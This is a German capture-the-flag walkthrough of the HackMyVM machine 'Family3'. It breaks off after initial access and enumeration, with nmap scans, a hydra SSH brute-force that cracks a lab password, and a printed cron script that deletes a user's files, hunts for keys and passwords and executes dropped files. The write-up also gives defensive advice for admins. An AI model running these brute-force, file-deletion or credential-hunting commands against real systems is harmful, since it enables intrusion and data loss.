@@ -1,0 +1,1468 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Family3 - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Family3 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe (Gelb/Orange) muss im CSS für diese Klasse definiert werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Gelb/Orange) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">env</div>
+                <div class="tool-item">netstat</div>
+                <div class="tool-item">who</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">julia</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">printenv</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">lsblk</div>
+                <div class="tool-item">mount</div>
+                <div class="tool-item">openssl</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-mum-dad">Privilege Escalation (mum -> dad)</a></li>
+                <li><a href="#privilege-escalation-dad-baby">Privilege Escalation (dad -> baby)</a></li>
+                <li><a href="#privilege-escalation-baby-root">Privilege Escalation (baby -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.114	08:00:27:47:c6:70	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>arp-scan -l</code> sendet ARP-Anfragen ins lokale Netzwerk, um aktive Geräte zu finden. Es wird ein Gerät mit der IP <code>192.168.2.114</code> und der MAC-Adresse <code>08:00:27:47:c6:70</code> (zugeordnet zu Oracle VirtualBox) identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich im Netzwerk lokalisiert. Dies ist die Grundlage für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen detaillierten Portscan auf die IP <code>192.168.2.114</code> durchführen.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring zur Erkennung von ARP-Scans implementieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.114 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 14:06 CET
+Nmap scan report for family (192.168.2.114)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+<span class="command">22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 6e20472a3e979823a310e5a4526418e2 (RSA)
+|   256 ca91c35550e59aa79e636e5473e3bcd9 (ECDSA)
+|_  256 9637cdae1f8ea6d0808cee7c85675b94 (ED25519)
+<span class="command">631/tcp open  ipp     CUPS 2.3</span>
+|_http-title: Home - CUPS 2.3.3op2
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: CUPS/2.3 IPP/2.1
+MAC Address: 08:00:27:47:C6:70 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms family (192.168.2.114)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird durchgeführt (SYN-Scan, Standard-Skripte, Versionen, OS-Erkennung, alle Ports, hohes Tempo). Es werden zwei offene Ports gefunden:
+                <ul>
+                    <li>Port <code>22</code>: OpenSSH 8.4p1 (Debian).</li>
+                    <li>Port <code>631</code>: CUPS 2.3 (Druckdienst mit Webinterface unter IPP - Internet Printing Protocol).</li>
+                </ul>
+                Das Nmap-Skript erkennt außerdem eine <code>robots.txt</code>-Datei auf dem CUPS-Dienst und identifiziert das OS als Linux.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche ist klein. SSH (Port 22) ist ein möglicher Einstiegspunkt, erfordert aber gültige Anmeldedaten. Der CUPS-Dienst (Port 631) könnte Konfigurationsinformationen oder Schwachstellen enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den CUPS-Dienst genauer untersuchen (Webinterface im Browser aufrufen, nach bekannten Schwachstellen für CUPS 2.3 suchen). SSH auf mögliche schwache Passwörter oder bekannte Schwachstellen für OpenSSH 8.4p1 prüfen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur notwendige Dienste laufen. CUPS sollte nur bei Bedarf aktiviert und entsprechend abgesichert sein. SSH aktuell halten und idealerweise Key-Authentifizierung erzwingen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Original -->
+                    <pre>
+http://192.168.2.114:631/robots.txt
+
+#
+# This file tells search engines not to index your CUPS server.
+#
+
+User-agent: *
+Disallow: /
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der <code>robots.txt</code>-Datei des CUPS-Dienstes wird angezeigt. Sie weist Suchmaschinen an, keine Seite des CUPS-Servers zu indizieren (<code>Disallow: /</code>).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die <code>robots.txt</code> selbst liefert keine direkten Hinweise auf Schwachstellen, bestätigt aber die Existenz des CUPS-Webinterfaces.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Webinterface unter <code>http://192.168.2.114:631</code> manuell untersuchen.<br><strong>Empfehlung (Admin):</strong> Standardkonfiguration, keine direkten Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Original, dies scheint eine Notiz aus der Untersuchung des CUPS-Interfaces zu sein -->
+                    <pre>
+_mum_printer-24  	d00020-001  	<span class="command">mum</span>  	1k  	1  	beendet am
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Zeile scheint aus der Job- oder Druckerliste des CUPS-Webinterfaces zu stammen. Sie zeigt einen Druckjob (ID `d00020-001`) für einen Drucker namens `_mum_printer-24`, der vom Benutzer `mum` eingereicht wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Der Benutzername `mum` wurde entdeckt. Dies ist ein wertvoller Hinweis für einen Passwort-Brute-Force-Angriff auf den SSH-Dienst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Benutzernamen `mum` für einen SSH-Brute-Force-Angriff verwenden.<br><strong>Empfehlung (Admin):</strong> Informationen in CUPS (Benutzernamen, Druckernamen, Jobdetails) können sensible Daten preisgeben. Den Zugriff auf das CUPS-Interface und dessen Informationsanzeige einschränken.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l mum -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.114:22 -I -t 64</span></div>
+                    <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *ss* ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-07 14:23:13
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344402 login tries (l:1/p:14344402), ~224132 tries per task
+[DATA] attacking ssh://192.168.2.114:22/
+[22][ssh] host: 192.168.2.114   login: mum   <span class="password">password: lovely</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `hydra` wird verwendet, um einen Wörterbuchangriff auf den SSH-Dienst (Port 22) des Ziels durchzuführen.
+                <ul>
+                    <li><code>-l mum</code>: Verwendet den zuvor gefundenen Benutzernamen `mum`.</li>
+                    <li><code>-P /usr/share/wordlists/rockyou.txt</code>: Verwendet die Passwortliste `rockyou.txt`.</li>
+                    <li><code>ssh://192.168.2.114:22</code>: Gibt das Zielprotokoll, die IP und den Port an.</li>
+                    <li><code>-I</code>: Ignoriert vorhandene Restore-Dateien.</li>
+                    <li><code>-t 64</code>: Verwendet 64 parallele Tasks (Hydra warnt, dass dies für SSH zu hoch sein könnte).</li>
+                </ul>
+                Hydra findet erfolgreich das Passwort `lovely` für den Benutzer `mum`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Ein gültiges Login (`mum:lovely`) wurde gefunden. Dies ermöglicht den initialen Zugriff auf das System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit den gefundenen Credentials per SSH auf dem Zielsystem einloggen.<br><strong>Empfehlung (Admin):</strong> Starke Passwortrichtlinien durchsetzen. SSH-Logins überwachen und fehlgeschlagene Versuche (Brute-Force) erkennen und blockieren (z.B. mit `fail2ban`). Die Anzahl paralleler SSH-Verbindungen pro Quelle begrenzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh mum@192.168.2.114</span></div>
+                    <pre>
+The authenticity of host '192.168.2.114 (192.168.2.114)' can't be established.
+ED25519 key fingerprint is SHA256:vZEvCqRgxS6H8cJ6Umlp0yPH8QAidaOqPupC9t/CPr0.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.114' (ED25519) to the list of known hosts.
+mum@192.168.2.114's password: <span class="password">lovely</span>
+Linux family 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Oct 23 17:43:43 2022 from fe80::d63d:7eff:fef1:3736%enp0s3
+<span class="password">mum@family:~$</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung als Benutzer `mum` zum Zielsystem aufgebaut. Nach Bestätigung des Host-Schlüssels wird das zuvor gefundene Passwort `lovely` eingegeben. Der Login ist erfolgreich, und wir erhalten eine Shell als Benutzer `mum`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der initiale Zugriff auf das System ist bestätigt. Wir können nun mit der Enumeration auf dem Zielsystem beginnen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Grundlegende Enumeration durchführen: Benutzerrechte prüfen (`id`, `sudo -l`), laufende Prozesse/Dienste untersuchen (`ps`, `ss`, `netstat`), SUID-Binaries suchen (`find`), Betriebssystem- und Kernel-Version prüfen.<br><strong>Empfehlung (Admin):</strong> SSH-Zugänge überwachen. Starke Passwörter bleiben essenziell.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:~$ <span class="command">ls</span></div>
+                    <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 20
+drwxr-xr-x 4 mum  mum  4096 Oct 24 07:35 .
+drwxr-xr-x 5 root root 4096 Oct 11 16:27 ..
+<span class="command">lrwxrwxrwx 1 root root    9 Oct 12 05:59 .bash_history -> /dev/null</span>
+-rw-r--r-- 1 mum  mum  3526 Oct 24 07:35 .bashrc
+drwxr-xr-x 3 mum  mum  4096 Oct  8 09:54 .local
+drwx------ 2 mum  mum  4096 Oct 22 16:04 .ssh
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis des Benutzers `mum` wird aufgelistet. Interessant ist, dass die `.bash_history` nach `/dev/null` verlinkt ist, was bedeutet, dass keine Befehlshistorie für diesen Benutzer gespeichert wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Fehlen der Bash-History erschwert die Nachverfolgung früherer Aktivitäten des Benutzers, ist aber für den weiteren Pentest nicht unmittelbar kritisch.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Home-Verzeichnisse prüfen.<br><strong>Empfehlung (Admin):</strong> Das Umleiten der History nach `/dev/null` kann eine bewusste Aktion zur Verschleierung sein. Logging und Monitoring auf Systemebene sind wichtig.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:~$ <span class="command">ls /home</span></div>
+                    <pre>
+<span class="command">baby</span>  <span class="command">dad</span>  <span class="command">mum</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die Auflistung von `/home` zeigt, dass es neben `mum` auch die Benutzer `baby` und `dad` gibt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies sind potenzielle Ziele für horizontale oder vertikale Privilegieneskalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, Informationen über diese Benutzer zu sammeln oder Zugriff auf deren Verzeichnisse zu erlangen.<br><strong>Empfehlung (Admin):</strong> Berechtigungen für Home-Verzeichnisse überprüfen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for mum: <span class="password">lovely</span>
+<span class="password">Sorry, user mum may not run sudo on family.</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>sudo -l</code> wird ausgeführt, um zu prüfen, ob `mum` irgendwelche `sudo`-Rechte hat. Nach Eingabe des Passworts (`lovely`) wird bestätigt, dass `mum` keine `sudo`-Befehle ausführen darf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine direkte Privilegieneskalation über `sudo` ist für den Benutzer `mum` nicht möglich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach anderen Wegen zur Privilegieneskalation suchen (SUID-Binaries, Kernel-Exploits, Fehlkonfigurationen, Cronjobs etc.).<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration, keine direkten Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:~$ <span class="command">ss -tulpe</span></div>
+                    <pre>
+Netid       State        Recv-Q       Send-Q               Local Address:Port                 Peer Address:Port       Process
+udp         UNCONN       0            0                          0.0.0.0:46554                     0.0.0.0:*           uid:108 ino:11742 sk:1 cgroup:/system.slice/avahi-daemon.service <->
+udp         UNCONN       0            0                          0.0.0.0:bootpc                    0.0.0.0:*           ino:11671 sk:2 cgroup:/system.slice/ifup@enp0s3.service <->
+udp         UNCONN       0            0                          0.0.0.0:631                       0.0.0.0:*           ino:12288 sk:3 cgroup:/system.slice/cups-browsed.service <->
+udp         UNCONN       0            0                          0.0.0.0:mdns                      0.0.0.0:*           uid:108 ino:11740 sk:4 cgroup:/system.slice/avahi-daemon.service <->
+udp         UNCONN       0            0                             [::]:59044                        [::]:*           uid:108 ino:11743 sk:5 cgroup:/system.slice/avahi-daemon.service v6only:1 <->
+udp         UNCONN       0            0                             [::]:mdns                         [::]:*           uid:108 ino:11741 sk:6 cgroup:/system.slice/avahi-daemon.service v6only:1 <->
+tcp         LISTEN       0            128                        0.0.0.0:ipp                       0.0.0.0:*           ino:12242 sk:7 cgroup:/system.slice/cups.service <->
+<span class="command">tcp         LISTEN       0            5                        127.0.0.1:8000                      0.0.0.0:*           uid:1000 ino:12193 sk:8 cgroup:/system.slice/cron.service <-></span>
+tcp         LISTEN       0            128                        0.0.0.0:ssh                       0.0.0.0:*           ino:11828 sk:9 cgroup:/system.slice/ssh.service <->
+tcp         LISTEN       0            128                           [::]:ipp                          [::]:*           ino:12243 sk:a cgroup:/system.slice/cups.service v6only:1 <->
+tcp         LISTEN       0            128                           [::]:ssh                          [::]:*           ino:11839 sk:b cgroup:/system.slice/ssh.service v6only:1 <->
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>ss -tulpe</code> listet alle lauschenden (LISTEN) und verbundenen (nicht gezeigt) TCP- und UDP-Sockets mit den zugehörigen Prozessen auf. Neben den bekannten Ports 22 (SSH) und 631 (CUPS/IPP) wird ein weiterer Dienst auf <code>127.0.0.1:8000</code> (localhost, Port 8000) identifiziert. Dieser Dienst wird von der Benutzer-ID (uid) `1000` ausgeführt und scheint zur CGroup `cron.service` zu gehören (was ungewöhnlich ist, oft laufen Webserver als `www-data` oder ein dedizierter User).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Dienst auf Port 8000 ist interessant. Da er auf localhost lauscht, ist er nicht direkt von außen erreichbar. Die UID 1000 gehört typischerweise dem ersten regulären Benutzer, der auf einem Debian-System erstellt wird. Da wir `mum` (UID 1002, siehe spätere `id`-Ausgabe) und `baby` (UID 1001, siehe spätere Eskalation) kennen, gehört UID 1000 sehr wahrscheinlich zu `dad`. Der Zusammenhang mit `cron.service` ist unklar, könnte aber auf einen Prozess hindeuten, der von einem Cronjob gestartet wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Dienst auf Port 8000 untersuchen. Da er nur lokal erreichbar ist, muss dies von der `mum`-Shell aus geschehen, oder mittels Port-Forwarding über SSH. Prüfen, was auf diesem Port läuft (z.B. mit `curl localhost:8000`).<br><strong>Empfehlung (Admin):</strong> Dienste sollten nicht unter Standard-Benutzer-UIDs laufen, wenn nicht unbedingt nötig. Den Zweck des Dienstes auf Port 8000 und seine Verknüpfung mit `cron.service` klären.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   391773     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
+   395401     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su
+   406591    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo
+   391770     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
+   391772     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
+   395708     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount
+   395706     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount
+   406183     24 -rwsr-xr-x   1 root     root        23448 Jan 13  2022 /usr/bin/pkexec
+   391769     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
+   395257     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
+   659853    472 -rwsr-xr-x   1 root     root       481608 Jul  2 00:37 /usr/lib/openssh/ssh-keysign
+   411860     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5 13:04 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   406186     20 -rwsr-xr-x   1 root     root          19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Sucht nach Dateien mit gesetztem SUID-Bit (`-perm -4000`), die also potenziell mit den Rechten des Besitzers (oft `root`) ausgeführt werden können. Die Liste zeigt Standard-Linux-SUID-Binaries.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Auf den ersten Blick keine ungewöhnlichen oder direkt ausnutzbaren SUID-Binaries gefunden. `pkexec` könnte für CVE-2021-4034 (PwnKit) anfällig sein, falls das System nicht gepatcht ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versionen der SUID-Binaries prüfen (insbesondere `pkexec`) und auf bekannte Schwachstellen untersuchen (z.B. mit `linpeas.sh` oder manuell).<br><strong>Empfehlung (Admin):</strong> Anzahl der SUID-Binaries minimieren. System aktuell halten, um bekannte SUID-Exploits zu verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/var/log/installer$ <span class="command">cat lsb-release</span></div>
+                    <pre>
+DISTRIB_ID=Debian
+DISTRIB_DESCRIPTION="Debian GNU/Linux installer"
+DISTRIB_RELEASE="<span class="command">11 (bullseye)</span> - installer build 20210731+deb11u5"
+X_INSTALLATION_MEDIUM=cdrom
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/var/log/installer/lsb-release` wird angezeigt und bestätigt, dass das Betriebssystem Debian 11 (Bullseye) ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Wichtige Information für die Suche nach spezifischen Exploits oder Konfigurationen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Information bei der Exploit-Suche berücksichtigen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/var/log/installer$ <span class="command">env</span></div>
+                    <pre>
+SHELL=/bin/bash
+PWD=/var/log/installer
+LOGNAME=mum
+XDG_SESSION_TYPE=tty
+MOTD_SHOWN=pam
+HOME=/home/mum
+LANG=C.UTF-8
+SSH_CONNECTION=192.168.2.121 45242 192.168.2.114 22
+XDG_SESSION_CLASS=user
+TERM=xterm-256color
+USER=mum
+SHLVL=1
+XDG_SESSION_ID=44
+XDG_RUNTIME_DIR=/run/user/1002
+SSH_CLIENT=192.168.2.121 45242 22
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus
+SSH_TTY=/dev/pts/0
+_=/usr/bin/env
+OLDPWD=/var/log
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>env</code> zeigt die Umgebungsvariablen für die aktuelle Shell des Benutzers `mum` an. Enthält Standardinformationen wie `HOME`, `USER`, `PATH` und die SSH-Verbindungsdetails.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Keine ungewöhnlichen oder direkt ausnutzbaren Umgebungsvariablen sichtbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den `PATH` auf schreibbare Verzeichnisse prüfen (unwahrscheinlich in diesem Standard-Setup).<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/tmp$ <span class="command">netstat -a -p --unix</span></div>
+                    <pre>
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node   PID/Program name     Path
+unix  3      [ ]         DGRAM                    10459    -                    /run/systemd/notify
+unix  2      [ ACC ]     STREAM     LISTENING     10462    -                    /run/systemd/private
+[...] (Lange Liste von Standard-Systemd/DBus/etc. Sockets)
+unix  2      [ ACC ]     STREAM     LISTENING     11907    -                    /run/php/php7.4-fpm.sock
+unix  2      [ ACC ]     STREAM     LISTENING     11388    -                    /run/avahi-daemon/socket
+unix  2      [ ACC ]     STREAM     LISTENING     11390    -                    /run/cups/cups.sock
+unix  2      [ ACC ]     STREAM     LISTENING     11394    -                    /run/dbus/system_bus_socket
+[...]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `netstat -a -p --unix` listet aktive Unix Domain Sockets auf. Diese werden für die Interprozesskommunikation auf dem lokalen System verwendet. Die Ausgabe zeigt viele Sockets, die zu Systemdiensten wie `systemd`, `dbus`, `cups`, `avahi` und `php7.4-fpm` gehören.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anwesenheit von `php7.4-fpm.sock` deutet darauf hin, dass PHP-FPM läuft, möglicherweise für einen Webserver (obwohl Nmap keinen Standard-Webserver auf Port 80/443 fand). Die anderen Sockets sind meist Standard.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen, ob es einen Webserver gibt, der PHP über diesen Socket nutzt (vielleicht auf einem nicht standardmäßigen Port oder nur intern).<br><strong>Empfehlung (Admin):</strong> Nicht benötigte Dienste (wie PHP-FPM, falls kein Webserver aktiv ist) deaktivieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/tmp$ <span class="command">cd /home/dad/project</span></div>
+                    <pre>
+bash: cd: /home/dad/project: Not a directory
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/tmp$ <span class="command">ls /home/dad/project</span></div>
+                    <pre>
+/home/dad/project
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/tmp$ <span class="command">cat /home/dad/project</span></div>
+                    <pre>
+#! /bin/bash
+
+find / -user mum -writable -exec rm {} \; 2>/dev/null
+find / -user mum -type f -name <span class="password">-exec</span> grep -il 'password' {} \; 2>/dev/null <!-- Syntaxfehler: -name ohne Argument -->
+find / -user mum -type f -name "id_rsa" 2>/dev/null
+find / -user mum -type f -name "authorized_keys" 2>/dev/null
+find / -mmin -30 -user mum 2>/dev/null | grep -v "/proc/"
+<span class="command">find /home/dad -type f ! -name "project" -user dad -executable -exec mv "{}" ~/survey \;</span>
+cat /var/mail/mum
+cat /home/mum/.bash_history 2>/dev/null
+cat /var/spool/cups/d0002
+<span class="command">for file in ~/survey/ ; do [[ -O $file ]] && bash $file 2>/dev/null ; done</span>
+strings /dev/mem -n100 | grep -i mum
+who -u |grep mum
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, in `/home/dad/project` zu wechseln, was fehlschlägt, da es sich um eine Datei handelt. Der Inhalt der Datei `/home/dad/project` wird angezeigt. Es ist ein Bash-Skript, das verschiedene Aktionen ausführt:
+                <ul>
+                    <li>Löscht alle Dateien, die `mum` gehören und für sie schreibbar sind.</li>
+                    <li>Sucht nach Dateien von `mum`, die 'password' enthalten (mit Syntaxfehler).</li>
+                    <li>Sucht nach SSH-Schlüsseln von `mum`.</li>
+                    <li>Sucht nach kürzlich geänderten Dateien von `mum`.</li>
+                    <li>**Entscheidend:** Verschiebt alle ausführbaren Dateien (außer `project` selbst) aus `/home/dad`, die `dad` gehören, in das Verzeichnis `~/survey` (das Home-Verzeichnis des Benutzers, der das Skript ausführt).</li>
+                    <li>Gibt Mails und History von `mum` aus.</li>
+                    <li>Gibt den Inhalt eines CUPS-Spool-Files aus.</li>
+                    <li>**Entscheidend:** Führt alle Dateien im Verzeichnis `~/survey` mit `bash` aus, *wenn* sie dem Benutzer gehören, der das Skript ausführt (`-O $file`).</li>
+                    <li>Versucht, `strings` auf `/dev/mem` auszuführen (erfordert Root).</li>
+                    <li>Zeigt an, ob `mum` angemeldet ist.</li>
+                 </ul>
+                 Da der Benutzer `mum` die Datei lesen kann, aber nicht `dad` ist, deutet vieles darauf hin, dass dieses Skript regelmäßig von einem anderen Benutzer (wahrscheinlich `dad` via Cronjob) ausgeführt wird. Der Webserver auf Port 8000 gehört `dad` (UID 1000).
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieses Skript ist der Schlüssel zur nächsten Privilegieneskalation. Wenn wir eine ausführbare Datei, die `dad` gehört, in `/home/dad` platzieren können, wird sie vom Cronjob nach `/home/dad/survey` verschoben und dort als `dad` ausgeführt. Wir (als `mum`) können nicht direkt in `/home/dad` schreiben, aber der Webserver auf Port 8000 läuft als `dad`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1. Eine Reverse-Shell-Payload erstellen.
